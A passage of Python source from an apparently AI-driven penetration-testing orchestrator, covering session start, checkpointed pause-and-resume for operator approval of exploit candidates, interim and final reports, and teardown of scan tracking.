        state.setdefault("auto_execute", bool(auto_execute))
        state.setdefault("exploit_phase", bool(exploit_phase))
        report(state)
        _msg(sid, "Reporter",
             "[interim] Report written for everything that did not need "
             "approval. The exploit above is the only outstanding item; "
             "approving it resumes the session and rewrites this report.")
        _emit("langgraph_interim_report", sid, {"reason": "awaiting_approval"})
    except Exception as e:  # noqa: BLE001
        _log.warning("[%s] interim report failed: %s", sid, e)


def _park_for_approval(sid: str, payload: dict) -> dict:
    """Record the pause so it is visible everywhere the operator looks: session
    status, a session message, session metadata and a webhook event. A blocked /
    waiting item that looks identical to a running one reads as a hang."""
    _msg(sid, "Exploit",
         "⏸ AWAITING OPERATOR APPROVAL — the graph is checkpointed in Postgres "
         "and will resume from this exact point.\n\n"
         f"Candidate:\n{(payload.get('candidate') or '')[:1500]}\n\n"
         f"Approve with: POST /pentest/{sid}/approve "
         '{"approved": true, "pending_exploit_id": "<uuid>"}',
         role="system")
    try:
        update_agent_session(_sid(sid), status="awaiting_approval",
                             metadata={"engine": ENGINE_NAME,
                                       "awaiting_approval": payload})
    except Exception:
        pass
    _emit("langgraph_awaiting_approval", sid,
          {"kind": payload.get("kind"), "target": payload.get("target")})
    return {"session_id": sid, "status": "awaiting_approval",
            "awaiting_approval": payload}


def _finish(sid: str, final: dict, session_name: str = "unnamed") -> dict:
    """Close the session out with the SAME lifecycle the AutoGen path had.

    Three things used to happen only on the AutoGen path, so they were about to
    be lost when it was retired:
      * `metadata.scans` / `scan_summary` from the scan tracker — the dashboard's
        per-session scan panel reads these,
      * `collect_session_outputs`, which writes the run's scans + transcript +
        report to a session directory on disk,
      * `_finalize_session`, which produces the flow summary, claim validation
        and the KB recommendation drain.
    """
    summary = (final.get("report") or "session complete")[:4000]

    scans_metadata: List[dict] = []
    scan_summary = None
    try:
        status = scan_tracker.get_session_status(sid)
        if isinstance(status, dict):
            scans_metadata = status.get("scans") or []
            scan_summary = status.get("summary")
    except Exception:
        pass

    # Honest status. The graph dispatches scans async and returns, so marking the
    # session "completed" while a full-port sweep is still running reads to the
    # operator as "done — and it found nothing" (analyze ran BEFORE the scan). So
    # if the session's scans have not finished, the session stays in an
    # in-progress `scanning` state; the post-scan re-analysis
    # (_rerun_analysis_when_scans_finish) flips it to `completed` once they do —
    # or leaves it here if they run long, so the session is never force-ended.
    running_now = []
    try:
        running_now = _running_scans(sid)
    except Exception:  # noqa: BLE001
        pass
    session_status = "scanning" if running_now else "completed"

    update_agent_session(
        _sid(sid), status=session_status, summary=summary,
        metadata={"engine": ENGINE_NAME,
                  "total_messages": len(_transcript),
                  "phase": final.get("phase"),
                  "steps": len(final.get("log", [])),
                  "scans": scans_metadata,
                  "scan_summary": scan_summary,
                  "scans_in_flight": [s.get("job_id") for s in running_now]},
    )

    try:
        from session_collector import collect_session_outputs
        started_at = getattr(scan_tracker._local, "started_at", "") or ""
        out_dir = collect_session_outputs(
            session_id=sid, session_name=session_name,
            scans_metadata=scans_metadata, session_started_at=started_at,
            conversation_messages=list(_transcript),
            final_report=final.get("report"),
        )
        if out_dir:
            _emit("langgraph_session_outputs_collected", sid, {"output_dir": str(out_dir)})
    except Exception as e:  # noqa: BLE001
        # Warned, not silent: "no session directory" is otherwise
        # indistinguishable from "the feature does not exist for this engine".
        _log.warning("[%s] session output collection failed: %s", sid, e)

    _emit("langgraph_session_completed", sid,
          {"phase": final.get("phase"), "steps": len(final.get("log", [])),
           "scans": len(scans_metadata)})
    return {"session_id": sid, "status": "completed"}


def _teardown(sid: str, auto_run_recommendations) -> None:
    """Run the shared end-of-session work (flow summary, claim validation, KB
    drain, scan persistence, tracker cleanup).

    Imported lazily because `autogen_service` imports THIS module — a top-level
    import would be circular. By the time a session runs, that module is loaded.

    `auto_run_recommendations` was accepted by this engine's entry point and then
    ignored, so a session launched with it on left its KB recommendations at
    status='pending' forever. This is where it gets honoured.
    """
    try:
        from autogen_service import _finalize_session
    except Exception as e:  # noqa: BLE001
        _log.warning("[%s] teardown unavailable: %s", sid, e)
        return
    try:
        _finalize_session(_sid(sid), auto_run_recommendations)
        # Schedule the post-scan re-analysis HERE rather than on the success
        # path, because a run does not always end successfully.
        #
        # A live test caught this: the graph never returned (the watchdog marked
        # the session `stalled` after 14 minutes) so teardown ran but the
        # scheduler, which sat after _finish() in the success branch, never did.
        # A session whose scans outlive it is EXACTLY the case that needs the
        # re-analysis, and a stalled run is one of the likeliest ways to get
        # there. _teardown is the one place all four exit paths meet.
        _maybe_schedule_rescan_analysis(sid, _rescan_state_for(sid))
    except Exception as e:  # noqa: BLE001
        _log.warning("[%s] teardown failed: %s", sid, e)


def _rescan_state_for(sid: str) -> dict:
    """The minimal state the re-analysis needs, read back from the session row.

    Read rather than passed so _teardown — which every exit path reaches — can
    schedule the re-analysis without each caller having to carry the state.
    """
    try:
        row = get_agent_session(_sid(sid)) or {}
        cfg = row.get("configuration") or {}
        return {
            "session_id": sid,
            "target": row.get("target_description") or cfg.get("target_description") or "",
            "task": cfg.get("initial_task") or "",
            "auto_execute": bool(cfg.get("auto_execute_scans")),
            "exploit_phase": bool(cfg.get("enable_exploit_phase")),
        }
    except Exception:  # noqa: BLE001
        return {"session_id": sid, "target": "", "task": "",
                "auto_execute": False, "exploit_phase": False}


def _maybe_schedule_rescan_analysis(sid: str, base_state: dict) -> None:
    """Start the post-scan re-analysis, but only if something is still running.

    A session whose scans all finished inside the run needs nothing; spawning a
    thread to discover that would just add noise.
    """
    try:
        running = _running_scans(sid)
    except Exception:  # noqa: BLE001
        return
    if not running:
        return
    _msg(sid, "Analyzer",
         f"[post-scan] {len(running)} scan(s) still running — the session is IN "
         f"PROGRESS (status 'scanning'), not complete. It finalizes to 'completed' "
         f"automatically once the scans finish and analysis re-runs over them.")
    t = threading.Thread(target=_rerun_analysis_when_scans_finish,
                         args=(sid, base_state), daemon=True,
                         name=f"rescan-analysis-{sid[:8]}")
    t.start()


def run_langgraph_session_sync(
    session_id,
    target_description: str,
    initial_task: str,
    max_rounds: int = 200,
    resume_context: Optional[str] = None,
    session_name: str = "unnamed",
    auto_execute_scans: bool = True,
    proxy: Optional[str] = None,
    port_profile: Optional[str] = None,
    web_profile: Optional[str] = None,
    auto_run_recommendations: Optional[bool] = None,
    exploit_phase: Optional[bool] = None,
    surface_test_phase: Optional[bool] = None,
    surface_target: Optional[str] = None,
    synthesize_tests: Optional[bool] = None,
    auto_exploit: Optional[bool] = None,
):
    """Drop-in LangGraph replacement for the AutoGen session runner."""
    from llm_metrics import LLMMetricsContext
    sid = str(session_id)
    if exploit_phase is None:
        exploit_phase = os.environ.get("LANGGRAPH_EXPLOIT_PHASE", "").strip().lower() in ("1", "true", "yes")
    if surface_test_phase is None:
        surface_test_phase = os.environ.get("LANGGRAPH_SURFACE_TEST_PHASE", "").strip().lower() in ("1", "true", "yes")
    if proxy:
        try:
            scan_tools.set_session_proxy(proxy)
        except Exception:
            pass

    task = initial_task
    if resume_context:
        task = f"{initial_task}\n\n[resumed context]\n{resume_context[:1000]}"

    # Same thread-local context AutoGen sets: without it /scans is empty for the
    # session, port_profile/web_profile are silently ignored, and no
    # llm_request_metrics row can be attributed.
    scan_tracker.set_session(sid, port_profile=port_profile, web_profile=web_profile)
    # set_session only reaches THIS thread. LangGraph runs its nodes on executor
    # threads, which inherit neither the thread-local nor the contextvar, so the
    # run is registered explicitly — otherwise every scan a node dispatches is
    # dropped by track_scan and the session reports zero.
    scan_tracker.register_run(sid)
    LLMMetricsContext.set_session(sid)
    _transcript.clear()

    update_agent_session(_sid(sid), status="active",
                         metadata={"engine": ENGINE_NAME,
                                   "exploit_phase": bool(exploit_phase),
                                   "surface_test_phase": bool(surface_test_phase)})
    _msg(sid, "Coordinator",
         f"LangGraph engine starting.\nTarget: {target_description[:300]}\nTask: {task[:300]}\n"
         f"auto_execute={bool(auto_execute_scans)} exploit_phase={bool(exploit_phase)}",
         role="system")
    _emit("langgraph_session_started", sid,
          {"target": target_description[:200],
           "auto_execute": bool(auto_execute_scans),
           "exploit_phase": bool(exploit_phase)})

    try:
        with _saver_cm() as saver:
            saver.setup()  # idempotent; creates the checkpoint tables
            graph = build_graph(saver)
            cfg = {"configurable": {"thread_id": sid}}
            final = graph.invoke({
                "session_id": sid, "target": target_description, "task": task,
                "auto_execute": bool(auto_execute_scans),
                "exploit_phase": bool(exploit_phase),
                "surface_test_phase": bool(surface_test_phase),
                "surface_synthesize": synthesize_tests,
                "surface_auto_exploit": auto_exploit,
                "surface_target_request": surface_target,
                "surface_target": None, "surface_tests": None,
                "surface_safe_results": None, "pending_surface_tests": None,
                "surface_decision": None, "phase": "recon",
                "findings": [], "log": [], "exploit_candidate": None,
                "exploit_decision": None, "report": None,
                # Seeded so the cycle counter starts at a number rather than
                # None. operator.add on enumeration_history needs a list to
                # append onto.
                "enumeration_cycles": 0, "enumeration_history": [],
            }, cfg)
            payload = _interrupt_payload(final, graph, cfg)
        if payload is not None:
            # Parked, NOT finished: the tracker context and the transcript must
            # survive for the resume, so no teardown here.
            #
            # But everything that did NOT need a human is already done, so it is
            # written up now rather than waiting on the approval.
            _interim_report(sid, final, target_description, task,
                            auto_execute_scans, exploit_phase)
            return _park_for_approval(sid, payload)
        result = _finish(sid, final, session_name)
        _teardown(sid, auto_run_recommendations)   # also schedules the re-analysis
        return result
    except Exception as e:  # noqa: BLE001
        update_agent_session(_sid(sid), status="failed",
                             summary=f"LangGraph engine error: {e}")
        _emit("langgraph_session_failed", sid, {"error": str(e)[:300]})
        # A failed run is exactly when the flow summary and claim validation
        # matter most — same reasoning as _finalize_session's own docstring.
        _teardown(sid, auto_run_recommendations)
        raise
    finally:
        try:
            LLMMetricsContext.flush_buffer()
            LLMMetricsContext.clear_session()
        except Exception:
            pass
        try:
            # Leaving a finished run registered would make it the "single active
            # run" that a LATER session's scans get attributed to.
            scan_tracker.unregister_run(sid)
        except Exception:
            pass


def get_pending_approval(session_id) -> Optional[dict]:
    """The interrupt a session is parked on, read from the Postgres checkpoint.

    Reads the checkpoint rather than the session row so it is true even if this
    process never ran the session — that durability is the point of the
    checkpointer."""
    sid = str(session_id)
    try:
        with _saver_cm() as saver:
            graph = build_graph(saver)
            cfg = {"configurable": {"thread_id": sid}}
            snap = graph.get_state(cfg)
            for task in (getattr(snap, "tasks", None) or []):
                for itr in (getattr(task, "interrupts", None) or []):
                    val = getattr(itr, "value", None)
                    return val if isinstance(val, dict) else {"value": val}
    except Exception:
        return None
    return None


def resume_langgraph_session_sync(session_id, approved: bool,
                                  pending_exploit_ids=None,
                                  note: Optional[str] = None):
    """Resume a session parked on an approval interrupt.

    `Command(resume=...)` continues the graph from the Postgres checkpoint — no
    new session row, no parent_session_id, no replay of the phases already done.
    That is the native replacement for the AutoGen resume-as-a-new-session hack.
    """
    from langgraph.types import Command
    from llm_metrics import LLMMetricsContext
    sid = str(session_id)

    row = get_agent_session(_sid(sid)) or {}
    config = row.get("configuration") or {}
    scan_tracker.set_session(sid, port_profile=config.get("port_profile"),
                             web_profile=config.get("web_profile"))
    scan_tracker.register_run(sid)
    LLMMetricsContext.set_session(sid)
    if config.get("proxy"):
        try:
            scan_tools.set_session_proxy(config["proxy"])
        except Exception:
            pass

    # A single id from an older caller is still accepted; the graph works in
    # lists now because the planner queues every candidate.
    if pending_exploit_ids is None:
        ids = []
    elif isinstance(pending_exploit_ids, (list, tuple)):
        ids = [str(i) for i in pending_exploit_ids if i]
    else:
        ids = [str(pending_exploit_ids)]

    update_agent_session(_sid(sid), status="active")
    _emit("langgraph_session_resumed", sid,
          {"approved": bool(approved), "pending_exploit_ids": ids})
    try:
        with _saver_cm() as saver:
            saver.setup()
            graph = build_graph(saver)
            cfg = {"configurable": {"thread_id": sid}}
            final = graph.invoke(
                Command(resume={"approved": bool(approved),
                                "pending_exploit_ids": ids,
                                "note": note or ""}), cfg)
            payload = _interrupt_payload(final, graph, cfg)
        if payload is not None:
            return _park_for_approval(sid, payload)
        result = _finish(sid, final, row.get("session_name") or "resumed")
        _teardown(sid, config.get("auto_run_recommendations"))
        return result
    except Exception as e:  # noqa: BLE001
        update_agent_session(_sid(sid), status="failed",
                             summary=f"LangGraph resume error: {e}")
        _emit("langgraph_session_failed", sid, {"error": str(e)[:300], "on": "resume"})
        _teardown(sid, config.get("auto_run_recommendations"))
        raise
    finally:
        try:
            LLMMetricsContext.flush_buffer()
            LLMMetricsContext.clear_session()
        except Exception:
            pass
        try:
            # Leaving a finished run registered would make it the "single active
            # run" that a LATER session's scans get attributed to.
            scan_tracker.unregister_run(sid)
        except Exception:
            pass
